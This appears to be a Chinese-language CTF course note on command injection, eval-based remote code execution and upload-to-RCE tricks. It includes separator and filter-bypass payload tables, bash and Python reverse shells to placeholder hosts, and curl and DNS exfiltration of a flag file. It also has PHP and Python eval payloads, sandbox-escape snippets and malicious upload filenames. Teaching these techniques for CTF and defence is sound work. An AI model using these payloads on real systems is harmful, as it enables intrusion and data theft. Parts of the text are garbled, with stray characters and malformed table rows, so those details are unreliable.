## 2 · 命令注入

### 2.1 先搞懂底層：`system()` 做了什麼

```c
// C 世界的 system():
fork() + execl("/bin/sh", "sh", "-c", "your-string", NULL)
```

**也就是**：內容交給 `/bin/sh` 解析，於是「任何 shell 語法」都活了起來——
管道 `|`、重定向 `>`、分號 `;`、邏輯符 `&&`/`||`、反引號、`$()`。

分類成兩個問題：
1. 怎麼把命令「塞得進去」？
2. `sh` 接受哪些「第 2 個命令」的分隔符？（如果第 1 個被 `sh` 擋掉怎麼繼續？）

### 2.2 分隔符全集（Linux `sh` 語法）

| # | 符號 | 語意 | 例子（`cat /flag` 為第二命令） |
|---|---|---|---|
| 1 | `;` | 順序執行 | `; cat /flag` |
| 2 | `\n`（換行） | 順序執行（等價 `;`） | `%0acat%20/flag` |
| 3 | `&` / `&&` | 後台 / 且 | ` && cat /flag` |
| 4 | `\|\|` | 或 | ` \|\| cat /flag` |
| 5 | `\|` | 管道 | ` \| cat /flag` |
| 6 | `` ` `` | 命令替換（字串） | `` `( cat /flag ) `` |
| 7 | `$()` | 命令替換 | `$(cat /flag)` |
| 8 | `(` `)` | 子 shell | `( cat /flag )` |

> **payload 換行 `%0a` 是黑名單「未考慮空白」時的救命稻草**：
>
> `GET /?ip=127.0.0.1%0acat%20flag`
>
> 因為`tr` 裡的`\n` 對 shell 來說是一樣的分隔符。

### 2.3 空格被禁的替代

| # | 字元示例 | 說明 |
|---|---|---|
| 1 | `${IFS}` | 內建分隔符（field separator） |
| 2 | `$IFS$9` | 同上， `9` 是字面上引數參數 |
| 3 | `{cat,/flag}` | brace 展开, Bash 慣用 |
| 4 | `%09` | tab，如上 |
| 5 | `%0b` `%0c` | 換行/縱向定位 |

### 2.4 關鍵字被黑名單「刪除」時的三種套套

| # | 方法 | 説明 |
|---|---|---|
| 1 | 變數拼接 | `a=ca;b=t;$a$b$IFS/flag` |
| 2 | 反引號嵌套 | `` a=`echo cat`; `$a` /flag `` |
| 3 | 字串拼接 `$@` | `c${a}t` （部分 shell 會丟棄空變數） |

### 2.5 資料外傳（Blind / blind 情境 = 攻擊者看不到輸出）

**情況一（內網出網自由）——直接起 reverse shell**：

```text
bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**情況二（出網受限）——帶外帶出**：

```text
curl <YOUR_HTTP_URL>/$(cat /flag | base64 -w 0)
ping -c 1 $(echo flag | md5sum | head -c 6).dnslog.cn
```

**情況三（य完整斷外）——本地鏈子**：`cat /flag > 本機 web 服務静态目錄` 然後用瀏覽器去 fetch。特殊場合多用 `scp`/`nc`。

### 2.6 特殊情境：上下文決定符號

| 語境 | 可用 | 檢測首選 |
|---|---|---|
| `ping $ip` (黑名單 `\|\|\|`) | `$());` | `; ping -c 1 <ip>` |
| `ping $ip` (黑 `\|\|` `;`) | `` `cat /flag` `` 或者 `\|` | `` `ls` `` → 看輸出是否有命令結果 |
| 白名單型參數（僅數字） | 型別混淆與 length 溢位（PHP `sprintf "%d"` 有差異） | int overflow |
| 後端 `->` 上的空字符串 | `+;` | 儘量配全文搜尋 |

### 2.7 shell 函數都會「本地」的陷阱

- `/bin/sh` 在 Ubuntu 常是 **dash**，`{cat,/flag}` 全法 dash 支持有限。改用 `bash` 語意 payload（重驗證）。
- `sh -c` 的環境裡 `PATH` 可能為空：`PATH=$PATH:/bin` 先 affirm。

### 2.8 一個完整的命令注入題解的 pattern（本題 W3 課堂 demo）

```bash
# 題目後端（示意）
<?php system("ping -c 1 " . $_GET["ip"]); ?>

# 攻擊流程（打本機靶機）:
curl 'http://target/?ip=127.0.0.1'
# ① 探黑名單
curl 'http://target/?ip=127.0.0.1;id'         # 若空，試 &&
curl 'http://target/?ip=127.0.0.1%0aid'       # 換行
curl 'http://target/?ip=127.0.0.1%26%26id'    # &#38;= &
# ② 命中後 cat flag
curl 'http://target/?ip=127.0.0.1%0al%27s'(url 編碼)
```

## 3 · 語言級 RCE（eval/callback 家族）

| 語法 | 版本/條件 | 範例 |
|---|---|---|
| `eval($code)` | 一切版本 | `eval('$_GET[\"c\"]')` |
| `assert($s)` (eval strings) | PHP < 7.2 | `assert($_GET[\"c\"])` |
| `create_function($args,$code)` | PHP < 7.2 | `$f = create_function('$a',$_GET['c']); $f(0);` |
| `preg_replace('/xxx/e', $repl, $s)` | PHP < 7.0 | `'/' . '.*/e' . '/'` |
| `call_user_func(\$f, \$args)` | 一切版本；`$f` 可注入 | 白名單`["phpinfo","assert"]` |
| 陣列式 call | `[$a,'class']->method() | 需可注入類名 |
| `str_replace`+`{`/`}` 技巧 | `yaml->parse()` 類 | 見 PHP_YAML |
| Python `eval`/`exec` | 同上 | `eval(input())` |
| Python `pickle.load` | 見 W6 | |

> PHP 8 已避免這條大半世界上最過分「單字函數式」注入; 但 CTF 舊題大量出現, 過國內環境老, 仍要懂。

### 使用方式

- eval 級 payload：`?c=system('cat /flag');`
- lambda complex: `?c=phpinfo();`
- Python eval：`?c=__import__("os").system("sh")`，沙盒版見 §3.1

### Python eval 沙盒規避鳴招（CTF 慣用五組）

```text
import 必用: __import__('os').system('ls')
內置的情況：().__class__.__mro__[1].__subclasses__()[x]
（受限後端：no builtins, import ban）在 {filter class__priority} 陷入：
  `{{}}.__class__.__base__.__subclasses__()` 列舉 type / os.sys …
class塞: '.' 擋-需用 attr()
```

> 更完整的沙盒逃逸列在 W6 SSTI 的 Python 段落；此處只是「eval 即 RCE」的延伸。

## 4 · 上傳到 RCE（索引；細節在 W4）

- 摘名穿越：`../../1.php`、`../var/www/html/1.php`
- 雙重副檔：`a.php.jpg`（Fast-CGI 生效但 File.general 會可以）
- 檔名特殊字元：`a.php.`、`a.PHP/`、`a.php%00.jpg`（PHP<5.3.4）
- `.htaccess` 上傳 + `AddType application/x-httpd-php .jpg`
- `.user.ini` 上傳 + `auto_prepend_file`（FastCGI dPHP-stream）
- zip/phar 包裡放 PHP 再引用 local；`phar://demo.zip/x.php`
